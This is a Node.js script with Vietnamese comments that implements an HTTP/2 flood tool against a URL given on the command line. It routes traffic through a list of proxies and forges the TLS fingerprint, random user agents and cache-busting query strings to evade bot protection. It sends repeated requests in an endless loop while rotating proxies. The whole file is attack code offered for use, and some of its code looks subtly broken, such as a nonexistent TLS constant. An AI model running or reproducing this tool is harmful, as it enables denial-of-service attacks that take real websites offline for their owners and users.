const { exec } = require('child_process');
const fs = require('fs');
const url = require('url');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');
const fakeua = require('fake-useragent');

// Thiết lập các tham số cơ bản
const objetive = process.argv[2];
const parsed = url.parse(objetive);
const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];
const SignalsList = sigalgs.join(':');

// Lớp xây dựng TLS
class TlsBuilder {
    constructor() {
        this.curve = "GREASE:X25519:x25519";
        this.sigalgs = SignalsList;
        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION |
                   crypto.constants.SSL_OP_NO_TICKET |
                   crypto.constants.SSL_OP_NO_SSLv2 |
                   crypto.constants.SSL_OP_NO_SSLv3 |
                   crypto.constants.SSL_OP_NO_COMPRESSION |
                   crypto.constants.SSL_OP_NO_RENEGOTIATION |
                   crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                   crypto.constants.SSL_OP_TLSEXT_PADDING |
                   crypto.constants.SSL_OP_ALL |
                   crypto.constants.SSLcom;
    }
    
    async http2TUNNEL(socket) {
        const uas = fakeua();
        
        // Thiết lập các thông số payload
        let payload = {
            ":method": "GET",
            "Referer": objetive,
            "User-agent": uas,
            "Cache-Control": 'no-cache, no-store, private, max-age=0, must-revalidate',
            "Pragma": 'no-cache, no-store, private, max-age=0, must-revalidate',
            'client-control': 'max-age=43200, s-max-age=43200',
            'Upgrade-Insecure-Requests': 1,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
            ":path": parsed.path + "?" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
        };
        
        // Tạo kết nối HTTP/2 thông qua TLS
        const tunnel = http2.connect(parsed.href, {
            createConnection: () => tls.connect({
                socket: socket,
                ciphers: tls.getCiphers().join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256" + ":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:" + 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                host: parsed.host,
                servername: parsed.host,
                secure: true,
                honorCipherOrder: true,
                requestCert: true,
                secureOptions: this.Opt,
                sigalgs: this.sigalgs,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
            }, () => {
                // Tạo và gửi các yêu cầu định kỳ
                setInterval(async () => {
                    await tunnel.request(payload).close();
                }, 1000); // Gửi yêu cầu mỗi giây
            })
        });
    }
}

// Đọc danh sách proxy từ file
const proxies = fs.readFileSync('utils/http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n').filter(Boolean);

// Khởi tạo HTTP agent để duy trì kết nối
const keepAliveAgent = new http.Agent({ keepAlive: true });

// Kiểm tra tính hợp lệ của proxy
async function checkProxy(proxy) {
    return new Promise((resolve, reject) => {
        proxy = proxy.split(':');
        const req = http.get({
            host: proxy[0],
            port: proxy[1],
            timeout: 10000,
            agent: keepAliveAgent,
            path: parsed.host + ":443"
        });
        
        req.end();
        
        req.on('connect', (_, socket) => {
            resolve(socket);
            req.close();
        });
        
        req.on('error', (err) => {
            reject(err);
            req.close();
        });
    });
}

// Chạy vòng lặp vô hạn để duy trì việc gửi yêu cầu
async function runWithValidProxy() {
    let validProxy = null;
    
    while (!validProxy) {
        const proxy = proxies.shift(); // Lấy proxy đầu tiên từ danh sách
        if (!proxy) {
            console.log('Không còn proxy khả dụng. Thoát.');
            process.exit();
        }
        
        try {
            validProxy = await checkProxy(proxy);
        } catch (err) {
            console.error(`Proxy ${proxy} không hoạt động, thử proxy khác...`);
        }
    }
    
    // Khởi tạo và sử dụng lớp xây dựng TLS
    const tlsBuilder = new TlsBuilder();
    tlsBuilder.http2TUNNEL(validProxy);
}

// Thiết lập lịch kiểm tra proxy
function scheduleProxyCheck() {
    const interval = setInterval(async () => {
        if (!proxies.length) {
            console.log('Không còn proxy khả dụng. Thoát.');
            clearInterval(interval);
            process.exit();
        }
        
        await runWithValidProxy();
    }, 5000); // Kiểm tra proxy mỗi 5 giây
}

// Bắt đầu chạy lịch kiểm tra proxy và gửi yêu cầu
scheduleProxyCheck();

// Bắt các lỗi không xử lý và xử lý không xác định
process.on('uncaughtException', (err) => {
    console.error('Lỗi không xử lý:', err);
    process.exit(1);
});

process.on('unhandledRejection', (err) => {
    console.error('Lỗi không xử lý:', err);
    process.exit(1);
});
